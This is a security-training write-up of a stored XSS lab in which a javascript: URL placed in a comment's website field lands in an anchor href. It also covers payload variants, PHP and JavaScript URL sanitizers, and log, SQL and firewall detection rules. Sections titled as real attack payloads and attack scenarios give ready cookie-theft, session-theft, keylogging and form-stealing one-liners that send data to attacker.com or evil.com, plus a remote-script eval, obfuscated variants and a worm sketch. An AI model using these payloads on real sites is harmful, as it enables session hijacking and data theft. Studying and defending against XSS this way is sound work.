# Stored XSS into Anchor href Attribute with Double Quotes HTML-Encoded

## Lab Overview
**Difficulty:** Apprentice  
**Vulnerability Type:** Stored Cross-Site Scripting (XSS)  
**Context:** Anchor `href` attribute  
**Objective:** Submit a comment that calls `alert()` when author name is clicked  
**Status:** ✅ Solved

---

## What is Stored XSS?

Stored XSS (also called Persistent XSS) is when malicious input is **saved to the server's database** and later displayed to other users without proper sanitization.

### Key Characteristics

| Feature | Stored XSS | Reflected XSS | DOM XSS |
|---------|------------|---------------|---------|
| **Persistence** | Saved in database | Not saved | Not saved |
| **Victims** | All who view content | One user (who clicks link) | One user |
| **Delivery** | Automatic | Requires social engineering | Requires social engineering |
| **Severity** | High to Critical | Medium to High | Medium to High |
| **Impact Scale** | Multiple users | Single user | Single user |

### Why Stored XSS is More Dangerous

1. **No Social Engineering Required:** Users naturally view the content
2. **Persistence:** Attack remains until manually removed
3. **Trust Factor:** Appears on legitimate site
4. **Worm Potential:** Can self-propagate (post more comments)
5. **Scale:** Affects every user who views the page

---

## The Vulnerability

### Comment Form Structure
```html
<form action="/post/comment" method="POST">
    <textarea name="comment"></textarea>    <!-- Comment text -->
    <input type="text" name="name">         <!-- Author name -->
    <input type="email" name="email">       <!-- Email address -->
    <input type="text" name="website">      <!-- Website URL (vulnerable!) -->
    <button type="submit">Post Comment</button>
</form>
```

### How Comments Are Rendered

When a comment is posted, the application generates HTML like this:

```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
        <a id="author" href="USER_WEBSITE_HERE">AUTHOR_NAME</a> | Date
    </p>
    <p>COMMENT_TEXT_HERE</p>
</section>
```

**Key Point:** The `website` field value is inserted directly into the `href` attribute!

### The Protection (and Its Limitation)

- **Protected:** Double quotes (`"`) are HTML-encoded to `&quot;`
- **Not Protected:** Other protocols like `javascript:`

This means:
- ❌ Can't break out of the attribute: `" onclick=alert(1) x="`
- ✅ Can use dangerous protocols: `javascript:alert(1)`

---

## The Solution

### Working Payload
In the **Website** field, enter:
```
javascript:alert(1)
```

### Complete Form Values

**Comment:**
```
Great post!
```

**Name:**
```
test
```

**Email:**
```
test@test.com
```

**Website:**
```
javascript:alert(1)
```

### How It Works

**Step 1: Submit the Comment**
Form data sent to server:
```
comment=Great post!
name=test
email=test@test.com
website=javascript:alert(1)
```

**Step 2: Server Stores in Database**
```sql
INSERT INTO comments (name, email, website, comment, postId)
VALUES ('test', 'test@test.com', 'javascript:alert(1)', 'Great post!', 7);
```

**Step 3: Server Generates HTML**
When page loads, server creates:
```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
        <a id="author" href="javascript:alert(1)">test</a> | 02 February 2026
    </p>
    <p>Great post!</p>
</section>
```

**Step 4: User Clicks Author Name**
When any user clicks the "test" link:
1. Browser sees `href="javascript:alert(1)"`
2. Recognizes `javascript:` pseudo-protocol
3. Executes the JavaScript code: `alert(1)`
4. Alert dialog appears! 🎉

**Step 5: Lab Solved** ✅

---

## Understanding the `javascript:` Pseudo-Protocol

### What Are URL Schemes/Protocols?

URL schemes tell the browser how to handle a link:

```html
<a href="http://example.com">HTTP link</a>
<a href="https://example.com">HTTPS link</a>
<a href="ftp://example.com">FTP link</a>
<a href="mailto:test@example.com">Email link</a>
<a href="tel:+1234567890">Phone link</a>
<a href="javascript:alert(1)">JavaScript execution</a>  ⚠️
```

### The `javascript:` Protocol

When a link uses `javascript:` protocol:
1. Browser **doesn't navigate** to a URL
2. Instead, it **executes the JavaScript code** after the colon
3. Happens in the current page's context (full access to DOM, cookies, etc.)

### Examples

```html
<!-- Simple alert -->
<a href="javascript:alert(1)">Click</a>

<!-- Access cookies -->
<a href="javascript:alert(document.cookie)">Click</a>

<!-- Multiple statements -->
<a href="javascript:alert(1);alert(2)">Click</a>

<!-- Fetch remote script -->
<a href="javascript:fetch('//evil.com/steal.js').then(r=>r.text()).then(eval)">Click</a>

<!-- Prevent navigation with void -->
<a href="javascript:void(alert(1))">Click</a>
```

### Why `void()` Is Often Used

Without `void()`, if the JavaScript returns a value, the browser might navigate to it:

```javascript
// Without void - might show return value as page content
javascript:1+1

// With void - prevents any navigation
javascript:void(1+1)

// For XSS, both work but void is cleaner
javascript:void(alert(1))
```

---

## Common Mistake (What NOT To Do)

### ❌ Wrong: Payload in Comment Field

If you put the payload in the **Comment** field:

```
Comment: javascript:alert(1)
Name: test
Email: test@test.com
Website: https://example.com
```

**Result:**
```html
<a id="author" href="https://example.com">test</a>
<p>javascript:alert(1)</p>
```

- The payload is just displayed as text
- Clicking the link goes to example.com
- No JavaScript execution ❌

### ✅ Correct: Payload in Website Field

```
Comment: Great post!
Name: test
Email: test@test.com
Website: javascript:alert(1)
```

**Result:**
```html
<a id="author" href="javascript:alert(1)">test</a>
<p>Great post!</p>
```

- The payload is in the `href` attribute
- Clicking the link executes JavaScript ✅

---

## Alternative Payloads

### Basic Variations
```javascript
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:void(alert(1))
```

### URL Encoding (if special chars filtered)
```
javascript:alert%281%29
```

### HTML Entity Encoding (rarely needed in href)
```
javascript&#58;alert(1)
```

### Using Different JavaScript Functions
```javascript
javascript:console.log('XSS')
javascript:confirm('XSS')
javascript:prompt('XSS')
javascript:print()
```

### Multiple Statements
```javascript
javascript:var x=1;alert(x)
javascript:alert(1);alert(2);alert(3)
```

### String Obfuscation
```javascript
javascript:eval(atob('YWxlcnQoMSk='))
```
(Base64 encoded `alert(1)`)

```javascript
javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```
(Character codes for `alert(1)`)

### Real Attack Payloads

**Cookie Theft:**
```javascript
javascript:fetch('//attacker.com/steal?c='+document.cookie)
```

**Session Token Theft:**
```javascript
javascript:location='//attacker.com/?token='+localStorage.getItem('session')
```

**Keylogging:**
```javascript
javascript:document.onkeypress=function(e){fetch('//attacker.com/log?k='+e.key)}
```

**Form Data Theft:**
```javascript
javascript:fetch('//attacker.com/',{method:'POST',body:new FormData(document.forms[0])})
```

---

## Why Double Quotes Don't Help

### The Encoding Applied
```php
// Server-side encoding (example)
$website = htmlspecialchars($_POST['website'], ENT_COMPAT);
// ENT_COMPAT only encodes double quotes, not single quotes
// But for this attack, we don't need to use quotes at all!
```

### Encoded Characters
```
" becomes &quot;
< becomes &lt;
> becomes &gt;
& becomes &amp;
```

### Why Our Payload Still Works

Our payload: `javascript:alert(1)`

**No encoded characters needed!**
- No quotes: `"`
- No angle brackets: `<>`
- No ampersands: `&`
- Just alphanumeric + `:` and `()`

The payload is a **valid href value** that doesn't require any special characters that would be encoded.

### Attempts That Would Fail

```html
<!-- Trying to break out of attribute -->
" onclick=alert(1) x="
Result: &quot; onclick=alert(1) x=&quot;  ❌

<!-- Trying to use HTML tags -->
<img src=x onerror=alert(1)>
Result: &lt;img src=x onerror=alert(1)&gt;  ❌

<!-- But javascript: works! -->
javascript:alert(1)
Result: javascript:alert(1)  ✅
```

---

## Prevention Strategies

### For Developers

#### ❌ Insufficient Protection

**Only encoding quotes:**
```php
$website = htmlspecialchars($_POST['website'], ENT_QUOTES);
echo '<a href="' . $website . '">Author</a>';
```
**Problem:** Still allows `javascript:` protocol!

**Blacklisting:**
```php
$website = str_replace('javascript:', '', $_POST['website']);
```
**Problem:** Easily bypassed with `JaVaScRiPt:`, `javascript%3A`, etc.

#### ✅ Proper Protection

**Method 1: Protocol Allowlist (Recommended)**
```php
function sanitizeURL($url) {
    $parsed = parse_url($url);
    $scheme = strtolower($parsed['scheme'] ?? '');
    
    // Only allow http and https
    if (!in_array($scheme, ['http', 'https'])) {
        return '#'; // Return safe default
    }
    
    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}

$safe_website = sanitizeURL($_POST['website']);
echo '<a href="' . $safe_website . '">Author</a>';
```

**Method 2: Force Protocol**
```php
function forceHTTP($url) {
    // Remove any existing protocol
    $url = preg_replace('#^[a-z]+:#i', '', $url);
    
    // Add http://
    return 'http://' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}
```

**Method 3: Strict Validation with Regex**
```php
function validateURL($url) {
    // Only accept http(s) URLs with proper format
    if (preg_match('#^https?://[a-z0-9.-]+\.[a-z]{2,}#i', $url)) {
        return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    }
    return '#';
}
```

**Method 4: Use URL Validation**
```php
$url = filter_var($_POST['website'], FILTER_VALIDATE_URL);
if ($url && in_array(parse_url($url, PHP_URL_SCHEME), ['http', 'https'])) {
    $safe_url = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
} else {
    $safe_url = '#';
}
```

#### JavaScript/Frontend Validation

```javascript
function sanitizeURL(url) {
    try {
        const parsed = new URL(url);
        
        // Only allow http and https
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return '#';
        }
        
        return url;
    } catch (e) {
        // Invalid URL
        return '#';
    }
}

// Usage
document.querySelector('form').addEventListener('submit', (e) => {
    const websiteInput = document.querySelector('input[name="website"]');
    websiteInput.value = sanitizeURL(websiteInput.value);
});
```

#### Content Security Policy (CSP)

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none'">
```

**Note:** CSP doesn't prevent `javascript:` URLs in href, but limits damage

#### Additional Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

---

## Real-World Attack Scenarios

### Scenario 1: Social Media Comments
An attacker posts a comment with malicious website:
```
Name: "Check out my awesome blog!"
Website: javascript:fetch('//evil.com?c='+document.cookie)
```

**Impact:**
- Every user who clicks the name has cookies stolen
- Attacker gains access to all accounts
- Could affect thousands of users

### Scenario 2: Forum Signatures
User profile with website field:
```
Website: javascript:document.body.innerHTML='<h1>Hacked</h1>'
```

**Impact:**
- Page content replaced for all viewers
- Defacement of the site
- Loss of user trust

### Scenario 3: Self-Propagating XSS Worm
```javascript
javascript:fetch('/post/comment',{
    method:'POST',
    body:new URLSearchParams({
        comment:'Cool post!',
        name:'User',
        email:'user@test.com',
        website:'javascript:'+document.currentScript.textContent
    })
})
```

**Impact:**
- Worm posts more malicious comments
- Spreads exponentially
- Can overwhelm the system

### Scenario 4: Session Hijacking
```javascript
javascript:fetch('//attacker.com/steal',{
    method:'POST',
    body:JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        url: location.href
    })
})
```

**Impact:**
- Complete session takeover
- Access to user accounts
- Identity theft

---

## Testing Methodology

### Step 1: Identify Input Points
Look for:
- Comment forms
- User profiles
- Guestbooks
- Review systems
- Any field labeled "Website" or "URL"

### Step 2: Test for Reflection
Submit a unique test string:
```
Website: http://test12345unique.com
```

View page source and search for `test12345unique`

### Step 3: Check Context
Determine where the input appears:
```html
<!-- In href attribute? -->
<a href="YOUR_INPUT_HERE">Link</a>

<!-- In src attribute? -->
<img src="YOUR_INPUT_HERE">

<!-- In text content? -->
<p>YOUR_INPUT_HERE</p>
```

### Step 4: Test for Encoding
Try special characters:
```
" ' < > & javascript:
```

Check if they're encoded in the output

### Step 5: Attempt javascript: Protocol
```
javascript:alert(document.domain)
```

### Step 6: Test Execution
Click the generated link to see if code executes

### Step 7: Confirm Persistence
- Refresh the page
- View from different account
- Confirm payload remains

---

## Detection and Monitoring

### For Security Teams

**1. Log Analysis**
```bash
# Search for javascript: in logs
grep -i "javascript:" /var/log/apache2/access.log

# Look for suspicious patterns
grep -E "(javascript:|data:|vbscript:)" /var/log/app.log
```

**2. Database Scanning**
```sql
-- Find comments with javascript: protocol
SELECT * FROM comments 
WHERE website LIKE '%javascript:%' 
   OR website LIKE '%data:%'
   OR website LIKE '%vbscript:%';
```

**3. Web Application Firewall (WAF) Rules**
```
# ModSecurity rule example
SecRule ARGS:website "javascript:" "id:1000,deny,status:403,msg:'XSS Attempt'"
```

**4. Automated Scanning**
Use tools like:
- Burp Suite Scanner
- OWASP ZAP
- Acunetix
- Netsparker

---

## Exploitation Flow Diagram

```
┌──────────────────────────────────────────┐
│  Attacker Fills Comment Form             │
│  - Name: test                            │
│  - Email: test@test.com                  │
│  - Website: javascript:alert(1)          │
│  - Comment: Great post!                  │
└───────────────┬──────────────────────────┘
                │
                ▼
┌──────────────────────────────────────────┐
│  Server Saves to Database                │
│  (Stored XSS - Persists!)                │
└───────────────┬──────────────────────────┘
                │
                ▼
┌──────────────────────────────────────────┐
│  Server Generates HTML for All Users     │
│  <a href="javascript:alert(1)">test</a>  │
└───────────────┬──────────────────────────┘
                │
                ▼
┌──────────────────────────────────────────┐
│  Victim Views Page                       │
│  Sees comment with clickable name        │
└───────────────┬──────────────────────────┘
                │
                ▼
┌──────────────────────────────────────────┐
│  Victim Clicks Author Name               │
└───────────────┬──────────────────────────┘
                │
                ▼
┌──────────────────────────────────────────┐
│  Browser Executes JavaScript             │
│  alert(1) pops up                        │
│  Could be: Cookie theft, defacement,     │
│  keylogging, etc.                        │
└──────────────────────────────────────────┘
```

---

## Key Takeaways

✅ **Stored XSS persists** in the database and affects all users  
✅ **javascript: protocol** executes JavaScript in href attributes  
✅ **No special characters needed** - can bypass encoding  
✅ **Website/URL fields** are common injection points  
✅ **Protocol allowlisting** is the best prevention  
✅ **Always validate and sanitize** URL fields  
✅ **Higher severity** than reflected XSS due to persistence  
✅ **Test carefully** - make sure payload goes in correct field!  

---

## Common Dangerous Protocols in HTML

| Protocol | Context | Example | Risk |
|----------|---------|---------|------|
| `javascript:` | href, src | `javascript:alert(1)` | XSS |
| `data:` | href, src | `data:text/html,<script>alert(1)</script>` | XSS |
| `vbscript:` | href (IE) | `vbscript:msgbox(1)` | XSS |
| `file:` | href | `file:///etc/passwd` | File disclosure |
| `about:` | href | `about:blank` | Limited risk |

---

## References & Resources

- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP: Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)
- [MDN: javascript: URIs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)

---

**Date Completed:** February 2, 2026  
**Working Payload:** `javascript:alert(1)` (in Website field)  
**Key Lesson:** Always test the correct input field - payload must go in Website field, not Comment field!  
**Key Technique:** Using `javascript:` pseudo-protocol in anchor href attribute to execute XSS
